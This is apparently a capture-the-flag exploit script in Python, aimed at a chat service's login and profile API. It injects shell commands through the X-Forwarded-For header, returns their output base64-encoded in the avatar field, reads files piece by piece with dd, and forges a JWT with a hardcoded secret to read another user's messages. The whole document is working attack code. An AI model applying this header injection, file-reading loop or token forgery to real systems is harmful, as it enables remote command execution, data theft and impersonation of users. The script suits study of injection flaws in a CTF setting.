import string
import requests
import base64
import json
import jwt

MY_IP = "your ip address"
JWT = "Pl4idC7F2020"

def run_command(command):
    url = "https://chat.mooz.pwni.ng/api/login"
    headers = {
        "X-Forwarded-For": "1.1.1.1' | echo $(%s | base64 -w0) MAGICMAGIC '" % command,
    }
    r=requests.post(url, headers=headers,
                data= '{"username":"a123123","password":"123123"}');

    assert r.status_code == 201

    token = json.loads(r.text)["token"]

    url = "https://chat.mooz.pwni.ng/api/profile"

    headers = {
        "X-Forwarded-For": "1.1.1.1' | echo $(%s | base64 -w0) MAGICMAGIC '" % command,
        "x-chat-authorization":token
    }
    r=requests.post(url, headers=headers,
                data= "{\"avatar\":\"iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAQAAAD9CzEMAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBBIVAx0cV5RhAAABSElEQVRYw+2TQStEURTHf4NETSyUqJGSYlIWFkoWZmFh87bKrHwDm8dSySilWLHhA1iOsrKwUEYpNSXNQhONSSlNsRg9M7oWTqfJ5j29u9L9vcU979zz/v/7zjsPHA6Hw+H4DyQiVfWxiEeKQZI8U+WRU/I0bB1ihU8MhjcuuSbAYDDcMW5H3hfBPO0ATFCXzANdNgyqIlfWdh5LxpAJf7wtcsUIYxJVdG/UhsGOrAXuJQp0byjcoCO0Yo8rZqhwwhedTDGL94fjRSbNOhd8aPd/rk074h43Ilhigwy7Ng0SHKicL3OUs2mwrGJnmjvUXC5cIOwzLWlU1GhSo2R8g16N0rLOMa25FDAcr0X7LTOzzTw+7zSpSaZJmQbdcQwGePo1mq8skG25P4r3BtDPFkVqBLxwzho9AGS5pU6J1Qi/qsPhcDhi8w319X/WwEB5cgAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMC0wNC0xOFQyMTowMzoyOSswMDowMBEz25kAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjAtMDQtMThUMjE6MDM6MjkrMDA6MDBgbmMlAAAAAElFTkSuQmCC\"}");

    assert r.status_code == 200
    return base64.b64decode(base64.b64decode(json.loads(r.text)["avatar"]).split(b"MAGICMAGIC")[0])

def read_file(file_name):
    d = b''
    index = 0
    while True:
        dd = run_command("dd if=%s bs=1 count=4096 skip=%d" % (file_name, index))
        if not dd:
            return d
        d += dd
        index += 4096

def get_messages():
    token = {'ipaddr': MY_IP, 'username': 'tomnook'}

    url = "https://chat.mooz.pwni.ng/api/messages"
    headers = {
        "x-chat-authorization": jwt.encode(token, JWT),
    }
    r=requests.get(url, headers=headers);

    assert r.status_code == 200
    return json.loads(r.text)

print(run_command("ls").decode())
print(read_file("start.sh").decode())

print(get_messages())
